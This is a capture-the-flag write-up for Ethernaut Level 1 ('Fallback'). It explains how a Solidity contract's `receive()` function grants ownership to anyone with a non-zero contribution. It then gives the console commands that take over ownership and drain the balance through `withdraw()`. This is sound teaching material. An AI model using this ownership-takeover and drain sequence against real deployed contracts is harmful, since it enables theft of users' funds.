# Ethernaut Level 1 — Fallback

## Introduction

**Fallback** is Level 1 of OpenZeppelin's Ethernaut Web3 CTF.

This level is an introduction to how a smart contract can receive Ether outside of a normal function call, and how an incorrectly designed `receive()` function can be used to change the contract's state.

The main objective is to become the owner of the contract and then drain its Ether balance.

Unlike Level 0, this level requires looking at the contract's logic and finding an unintended way to satisfy the ownership condition.

### What this level teaches

- How to inspect a Solidity contract before interacting with it
- How to inspect a contract object and its ABI
- How `msg.sender` works
- How mappings can track contributions
- How modifiers such as `onlyOwner` restrict access
- How `receive()` handles direct Ether transfers
- How empty calldata can trigger `receive()`
- How a vulnerable state-changing function can lead to ownership takeover

---

## Objective

The objective of this level is to become the owner of the `Fallback` contract and use the `withdraw()` function to drain its Ether balance.

To do that, I needed to find a way to change:

```solidity
owner
```

to my own address.

---

## 1. Understanding the Contract

I first checked the contract code given in the challenge and went through the functions and modifier to understand how the contract worked.

### `contributions`

```solidity
mapping(address => uint256) public contributions;
```

This mapping keeps track of how much Ether each address has contributed.

The address is used as the key, and the contribution amount is stored as the value.

### `owner`

```solidity
address public owner;
```

This stores the current owner of the contract.

### Constructor

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}
```

The first thing I noticed here was:

```solidity
owner = msg.sender;
```

When the contract is deployed, `msg.sender` is the account that deployed it, so that account becomes the initial owner.

The next line was also important:

```solidity
contributions[msg.sender] = 1000 * (1 ether);
```

This means that the original owner's contribution is set to **1000 ETH**.

So from the start, the original owner already has a very large contribution compared to what I can send through the `contribute()` function.

### `onlyOwner` Modifier

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
}
```

This modifier checks whether the caller is the current owner.

If:

```solidity
msg.sender == owner
```

is false, the transaction will revert.

The `_` represents the function body that is executed if the condition passes.

### `contribute()`

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;

    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

This function allows users to contribute Ether.

The first thing I noticed was:

```solidity
require(msg.value < 0.001 ether);
```

So the amount sent in a single contribution must be less than `0.001 ETH`.

Then the contribution is added to the sender's total:

```solidity
contributions[msg.sender] += msg.value;
```

There is also an ownership condition:

```solidity
if (contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}
```

This means that if my total contribution becomes greater than the owner's contribution, I become the owner.

At first, this looked like the obvious way to become the owner. However, the constructor already gives the original owner a contribution of `1000 ETH`.

Because `contribute()` only accepts values below `0.001 ETH`, trying to beat the original owner's contribution is not a realistic approach.

### `getContribution()`

```solidity
function getContribution() public view returns (uint256) {
    return contributions[msg.sender];
}
```

This function returns the contribution associated with the caller's address.

### `withdraw()`

```solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

This transfers the entire Ether balance of the contract to the owner.

The important part here is the `onlyOwner` modifier, so I could not use `withdraw()` until I became the owner.

### `receive()`

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

This was the part that caught my attention.

The `receive()` function is triggered when the contract receives Ether with empty calldata.

It checks:

```solidity
require(msg.value > 0 && contributions[msg.sender] > 0);
```

So the sender needs to send some Ether and already have a contribution greater than zero.

If both conditions are satisfied, it executes:

```solidity
owner = msg.sender;
```

This gives me another way to become the owner without trying to beat the original owner's `1000 ETH` contribution.

---

## 2. Inspecting the Contract and ABI

After going through the source code, I opened the browser console and typed:

```javascript
contract
```

The browser console displayed the contract object along with the methods exposed through its ABI.

Among the available functions, I could see:

```text
contribute()
contributions()
getContribution()
owner()
withdraw()
```

I could also use `sendTransaction()` on the contract object to send Ether directly to the contract.

This was useful because I could confirm what I was able to interact with from the console.

---

## 3. Making a Contribution

After looking at `receive()`, I noticed that it requires:

```solidity
contributions[msg.sender] > 0
```

So before triggering `receive()`, I first needed to make a contribution.

I used:

```javascript
await contract.contribute({value: toWei('0.0001')})
```

The value is below the `0.001 ETH` limit imposed by `contribute()`.

At this point, my address had a non-zero contribution.

---

## 4. Finding Another Way to Become the Owner

Initially, I looked at the ownership logic inside `contribute()`:

```solidity
if (contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}
```

But after checking the constructor, I knew that the original owner already had a contribution of:

```solidity
1000 * (1 ether)
```

So trying to become the owner through this condition did not make sense.

Instead, I searched for other places where the `owner` variable was changed.

That led me back to the `receive()` function:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

This was the important part.

I realized that I did not need to make my contribution greater than the owner's contribution.

I only needed my contribution to be greater than zero, which I had already achieved.

---

## 5. Triggering `receive()`

The `receive()` function is not called like a normal Solidity function.

Instead, it is triggered when Ether is sent directly to the contract without specifying a normal function call.

So I used:

```javascript
await contract.sendTransaction({value: toWei('0.0001')})
```

This sends `0.0001 ETH` directly to the contract.

The transaction does not specify a normal function to call, so the calldata is empty.

Because the contract receives Ether with empty calldata, the `receive()` function is triggered.

It then checks:

```solidity
require(msg.value > 0 && contributions[msg.sender] > 0);
```

At this point:

```text
msg.value > 0
        ↓
      TRUE
```

and:

```text
contributions[msg.sender] > 0
        ↓
      TRUE
```

So the following line executes:

```solidity
owner = msg.sender;
```

My address is now the owner of the contract.

This was the main trick of the level. Instead of trying to beat the original owner's `1000 ETH` contribution, I used the `receive()` function after making the small contribution required by its `require` statement.

---

## 6. Withdrawing the Contract Balance

Now that I had become the owner, the `onlyOwner` modifier on `withdraw()` would allow me to execute it.

I called:

```javascript
await contract.withdraw()
```

The function contains:

```solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

Since I was now the owner, the `onlyOwner` check was satisfied.

The entire Ether balance of the contract was then transferred to the current owner, which was my address.

---
### Final Commands

Make a contribution:

```javascript
await contract.contribute({value: toWei('0.0001')})
```

Trigger `receive()`:

```javascript
await contract.sendTransaction({value: toWei('0.0001')})
```

Withdraw the balance:

```javascript
await contract.withdraw()
```

## Level 1 — Completed ✅
